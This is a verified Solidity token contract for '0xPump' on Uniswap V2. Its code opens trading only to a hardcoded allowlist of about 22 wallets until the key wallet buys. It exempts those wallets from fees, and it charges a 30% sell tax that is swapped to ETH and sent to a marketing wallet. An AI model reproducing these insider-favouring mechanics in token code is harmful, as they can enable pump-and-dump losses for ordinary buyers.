/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
 
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}
 
contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}
 
contract xPump is Ownable {
    string private constant NAME =  "0xPump";
    string private constant SYMBOL = "$0xP";
    uint8 private constant DECIMALS = 9;
    uint8 private _fee = 30;
    IRouter private immutable _uniswapV2Router;
    address private immutable _uniswapV2Pair;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private constant TOTAL_SUPPLY = 1e8 * 1e9;
    address private constant DEAD_WALLET = address(0xdEaD);
    address private constant ZERO_WALLET = address(0);
    address private constant DEPLOYER_WALLET = 0x5749fE4E89Fe12aEFF098D97DD01B557254e7F63;
    address private constant KEY_WALLET = 0x5749fE4E89Fe12aEFF098D97DD01B557254e7F63;
    address private constant MARKETING_WALLET = payable(0xa33BC354A9D708C41909C167f38a02128908502A);
    address[] private mW;
    address[] private xL;
    address[] private xF;
    mapping (address => bool) private mWE;
    mapping (address => bool) private xLI;
    mapping (address => bool) private xFI;
    bool private _tO = false;
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
 
    constructor() {
        _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswapV2Pair = IFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        xL = [DEPLOYER_WALLET, KEY_WALLET, DEAD_WALLET, 0xeC78b5Ce3d183598B86570420B98CC5Ff6107dCB,0xFE60Cb722D416842d43BdDcC50Eefd8658E5Ae0B,0x27F079620349c6fb10dee4938522C7B968d9C6b0,0xD231c521Fb9Eb54215e19C8137e82a023d932438,0xf3B974602aA758980Ac28680404AD7C26aE6A353,0xE275818CfA81fA7396ba61648f8a4E27D1bfDA69,0x79DcEfdcDB18b31f730406F5F965663851Df8949,0x1e7e0ae7e0Be9Fc3c9d27D270DeB8ead06eA553B,0x77DBAD80700FE4d49A6dC351F9C9f3F8e0D9a81a,0x9Ad025BC9b01CD0C3bb5e4fb0342572dbde02B8F,0x8D4A356afc6059602ee7ff2173E434a7e84ba139,0x0f3e057f938dFf6D4228d8063DdC6644cb6aF5E1,0xdf174e9d499a7c622C20705da00Dff058f35507c,0x41524D1351968548e74884aC9639EFcEb1448557,0x1cB9dC92d08E16ca5473f085FC0d45331a747DbF,0x2e3482CfA2c0BA0D034A6Eba111b632Ae1cE5e82,0x8CdA47a69087009D07cEDA9f5e4c4f59a216D46D,0x3bda7Ac348255EBD6B09299e26C40dF67EC47B75,0x313EfbD8020AF91dFB22802c98295F534e0810ce,0x5b88fBE62AE7C6C8e9F0ef88AE2aC341655F9489,0x6AE9923Ad9d1c3A76e6408458FbE03121356D638,0x0EF6D7b583334c905C4cdaC9f90172f262D527C5];
        mW = [DEPLOYER_WALLET, KEY_WALLET, DEAD_WALLET, address(_uniswapV2Router), _uniswapV2Pair, address(this)];
        xF = [DEPLOYER_WALLET, KEY_WALLET, DEAD_WALLET, address(this), 0xeC78b5Ce3d183598B86570420B98CC5Ff6107dCB,0xFE60Cb722D416842d43BdDcC50Eefd8658E5Ae0B,0x27F079620349c6fb10dee4938522C7B968d9C6b0,0xD231c521Fb9Eb54215e19C8137e82a023d932438,0xf3B974602aA758980Ac28680404AD7C26aE6A353,0xE275818CfA81fA7396ba61648f8a4E27D1bfDA69,0x79DcEfdcDB18b31f730406F5F965663851Df8949,0x1e7e0ae7e0Be9Fc3c9d27D270DeB8ead06eA553B,0x77DBAD80700FE4d49A6dC351F9C9f3F8e0D9a81a,0x9Ad025BC9b01CD0C3bb5e4fb0342572dbde02B8F,0x8D4A356afc6059602ee7ff2173E434a7e84ba139,0x0f3e057f938dFf6D4228d8063DdC6644cb6aF5E1,0xdf174e9d499a7c622C20705da00Dff058f35507c,0x41524D1351968548e74884aC9639EFcEb1448557,0x1cB9dC92d08E16ca5473f085FC0d45331a747DbF,0x2e3482CfA2c0BA0D034A6Eba111b632Ae1cE5e82,0x8CdA47a69087009D07cEDA9f5e4c4f59a216D46D,0x3bda7Ac348255EBD6B09299e26C40dF67EC47B75,0x313EfbD8020AF91dFB22802c98295F534e0810ce,0x5b88fBE62AE7C6C8e9F0ef88AE2aC341655F9489,0x6AE9923Ad9d1c3A76e6408458FbE03121356D638,0x0EF6D7b583334c905C4cdaC9f90172f262D527C5];
        for (uint8 i=0;i<xL.length;i++) { xLI[xL[i]] = true; }
        for (uint8 i=0;i<mW.length;i++) { mWE[mW[i]] = true; }
        for (uint8 i=0;i<xF.length;i++) { xFI[xF[i]] = true; }
        balances[DEPLOYER_WALLET] = TOTAL_SUPPLY;
        emit Transfer(ZERO_WALLET, DEPLOYER_WALLET, TOTAL_SUPPLY);
    }
 
    receive() external payable {} // so the contract can receive eth
    function name() external pure returns (string memory) { return NAME; }
    function symbol() external pure returns (string memory) { return SYMBOL; }
    function decimals() external pure returns (uint8) { return DECIMALS; }
    function totalSupply() external pure returns (uint256) { return TOTAL_SUPPLY; }
    function taxFee() external view returns (uint8) { return _fee; }
    function uniswapV2Pair() external view returns (address) { return _uniswapV2Pair; }
    function uniswapV2Router() external view returns (address) { return address(_uniswapV2Router); }
    function deployerAddress() external pure returns (address) { return DEPLOYER_WALLET; }
    function marketingAddress() external pure returns (address) { return MARKETING_WALLET; }
    function balanceOf(address account) public view returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view returns (uint256) { return _allowances[owner][spender]; }
 
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
 
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        require(amount <= _allowances[sender][msg.sender]);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
 
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool){
        _approve(msg.sender,spender,_allowances[msg.sender][spender] + addedValue);
        return true;
    }
 
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        require(subtractedValue <= _allowances[msg.sender][spender]);
        _approve(msg.sender,spender,_allowances[msg.sender][spender] - subtractedValue);
        return true;
    }
 
    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != ZERO_WALLET && spender != ZERO_WALLET);
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function withdrawStuckETH() external returns (bool succeeded) {
        require(msg.sender == DEPLOYER_WALLET && address(this).balance > 0);
        (succeeded,) = MARKETING_WALLET.call{value: address(this).balance, gas: 30000}("");
        return succeeded;
    }
 
    function setTax(uint8 newFee) external onlyOwner {
        require(msg.sender == DEPLOYER_WALLET && newFee < 25);
        _fee = newFee;
    }
 
    function _transfer(address from, address to, uint256 amount) internal {
        require(
            (from != ZERO_WALLET && to != ZERO_WALLET) && (amount > 0) &&
            (amount <= balanceOf(from)) && (_tO || xLI[to] || xLI[from]) &&
            (mWE[to] || balanceOf(to) + amount <= TOTAL_SUPPLY / 50)
        );
        if (from == _uniswapV2Pair && to == KEY_WALLET && !_tO) { _tO = true; }
        if ((from != _uniswapV2Pair && to != _uniswapV2Pair) || xFI[from] || xFI[to]) { 
            balances[from] -= amount;
            balances[to] += amount;
            emit Transfer(from, to, amount);
        } else {
            balances[from] -= amount;
            if (_fee > 0 && to == _uniswapV2Pair) {
                balances[address(this)] += amount * _fee / 100;
                emit Transfer(from, address(this), amount * _fee / 100);
                if (balanceOf(address(this)) > TOTAL_SUPPLY / 4000) {
                    _swapTokensForETH(balanceOf(address(this)));
                    bool succeeded = false;
                    (succeeded,) = MARKETING_WALLET.call{value: address(this).balance, gas: 30000}(""); 
                }
            }
            balances[to] += amount - (amount * _fee / 100);
            emit Transfer(from, to, amount - (amount * _fee / 100)); 
        }
    }
 
    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
}